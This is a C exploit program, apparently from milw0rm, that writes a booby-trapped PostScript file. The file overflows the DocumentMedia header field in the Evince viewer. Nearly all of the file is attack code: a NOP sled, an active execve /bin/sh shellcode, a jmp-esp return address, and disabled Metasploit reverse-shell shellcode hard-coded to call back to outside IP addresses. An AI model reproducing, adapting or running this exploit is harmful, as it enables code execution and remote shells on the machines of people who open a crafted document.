/*
 * Creator: K-sPecial (xzziroz.net) of .aware (awarenetwork.org)
 * Name: evince-ps-field-bof.c
 * Date: 11/27/2006
 * Version: 
 * 1.00 - creation
 *
 * Other: this idea originaly came from the bid for the 'gv' buffer overflow (20978), i don't
 *  believe it's known until now that evince is also vulnerable. 
 *
 * Compile: gcc -o epfb evince-ps-field-bof.c -std=c99
 */
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>

// insert shellcode here, i'm not going to implement ip/port changing since
// metasploit's shellcode generation engine does it just fine. i had a picky time
// with the shellcodes, there must be some bad bytes. this shellcode from 
// metasploit works but be SURE to set Encoder=None

/* linux_ia32_reverse -  LHOST=67.76.107.14 LPORT=5555 Size=70 Encoder=None http://metasploit.com */
/* Original Buffer */
#if 0 /* face palm, I'm on 64-bits... */
char cb[] =
"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59"
"\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\x43\x4c\x6b\x0e\x66\x68"
"\x15\xb3\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd"
"\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
   "\x89\xe1\xb0\x0b\xcd\x80";
#endif

#if 0 /* And this is also x86 assembly */
char cb[] =
"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59"
"\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68"
   /* Let's use 128.83.122.102 (dvorak) instead*/
   /* "\x43\x4c\x6b\x0e" /* LHOST IP address */
   /* ['0x80', '0x53', '0x7a', '0x66'] */
   "\x80\x53\x7a\x66"
"\x66\x68"
   "\x15\xb3" /* LPORT */
"\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd"
"\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
   "\x89\xe1\xb0\x0b\xcd\x80";
#endif
/*
  400562:	48 31 c0             	xor    %rax,%rax
  400565:	48 31 d2             	xor    %rdx,%rdx
  400568:	48 31 f6             	xor    %rsi,%rsi
  40056b:	52                   	push   %rdx
  40056c:	48 bf 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rdi
  400573:	2f 73 68
  400576:	57                   	push   %rdi
  400577:	48 89 e7             	mov    %rsp,%rdi
  40057a:	b0 3b                	mov    $0x3b,%al
  40057c:	0f 05                	syscall
*/
char cb[] =
   /* "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" */
   /* "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" */
   /* "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" */
   "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\x52\x48\xbf\x2f\x62\x69\x6e"
   "\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05";

// location of "jmp *%esp"
char jmpesp[] = "\x77\xe7\xff\xff";

int main (int argc, char **argv) {
   FILE *fh;

   if (!(fh = fopen(*(argv+1), "w+b"))) { 
      printf("%s <file.ps>\n\n", *(argv));
      printf("[-] unable to open file '%s' for writing: %s\n", *(argv+1), strerror(errno));
      exit(1);
   }

   fputs("%!PS-Adobe-3.0\n", fh);
   fputs("%%Title: hello.ps\n", fh);
   fputs("%%For: K-sPecial (xzziroz.net) of .aware (awarenetwork.org)\n", fh);
   fputs("%%BoundingBox: 24 24 588 768\n", fh);
   fputs("%%DocumentMedia: ", fh);
   for (int i = 0; i < 100; i++)
      fputc(0x90, fh);
   /* for (int i = 0; i < 134; i++)  */
   /*    fputc(0x90, fh); */

   fwrite(cb, strlen(cb), 1, fh);

   for (int i = strlen(cb) + 100; i < 273; i++) 
      fputc('A', fh);

   fwrite(jmpesp, 4, 1, fh);
   fwrite("\xe9\x02\xff\xff\xff", 5, 1, fh);

   fputc('\n', fh);

   fputs("%%DocumentData: Clean7Bit\n", fh);
   fputs("%%Orientation: Landscape\n", fh);
   fputs("%%Pages: 1\n", fh);
   fputs("%%PageOrder: Ascend\n", fh);
   fputs("%%+ encoding ISO-8859-1Encoding\n", fh);
   fputs("%%EndComments\n", fh);

   return(0);
}

// milw0rm.com [2006-11-28]
